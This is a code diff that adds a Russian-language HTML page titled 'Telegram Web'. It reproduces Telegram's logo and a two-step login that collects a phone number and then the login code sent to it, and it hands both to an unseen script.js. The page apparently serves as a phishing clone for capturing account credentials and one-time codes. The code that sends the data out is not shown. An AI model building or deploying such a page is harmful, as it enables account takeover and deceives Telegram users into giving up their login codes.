@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Web</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="tg-container">
+    <div class="tg-logo">
+      <svg viewBox="0 0 240 240" width="160" height="160">
+        <circle cx="120" cy="120" r="120" fill="#2AABEE"/>
+        <path fill="#fff" d="M54 118l108-42c5-2 9 1 7 9l-18 85c-1 6-5 7-10 4l-28-21-13 13c-2 2-3 3-6 3l2-30 55-50c2-2 0-3-3-1l-68 43-29-9c-6-2-6-6 1-8z"/>
+      </svg>
+    </div>
+
+    <div id="step1" class="step active">
+      <h1>Вход в Telegram</h1>
+      <p class="sub">Введите номер телефона</p>
+      <form id="phoneForm">
+        <div class="input-group">
+          <select name="country" id="country">
+            <option value="+7">🇷🇺 +7</option>
+            <option value="+380">🇺🇦 +380</option>
+            <option value="+375">🇧🇾 +375</option>
+            <option value="+373">🇲🇩 +373</option>
+            <option value="+1">🇺🇸 +1</option>
+            <option value="+44">🇬🇧 +44</option>
+            <option value="+49">🇩🇪 +49</option>
+          </select>
+          <input type="tel" name="phone" id="phone" placeholder="Номер телефона" required autocomplete="tel">
+        </div>
+        <button type="submit" class="btn-primary">Далее</button>
+      </form>
+    </div>
+
+    <div id="step2" class="step">
+      <h1>Введите код</h1>
+      <p class="sub">Мы отправили код в Telegram на номер <span id="phoneDisplay"></span></p>
+      <form id="codeForm">
+        <input type="hidden" name="phone_final" id="phoneFinal">
+        <div class="input-group code-group">
+          <input type="text" name="code" id="code" placeholder="Код" maxlength="5" inputmode="numeric" required autocomplete="one-time-code">
+        </div>
+        <button type="submit" class="btn-primary">Войти</button>
+        <p class="resend">Не пришёл код? <a href="#" onclick="resend();return false;">Отправить повторно</a></p>
+      </form>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+  </html>
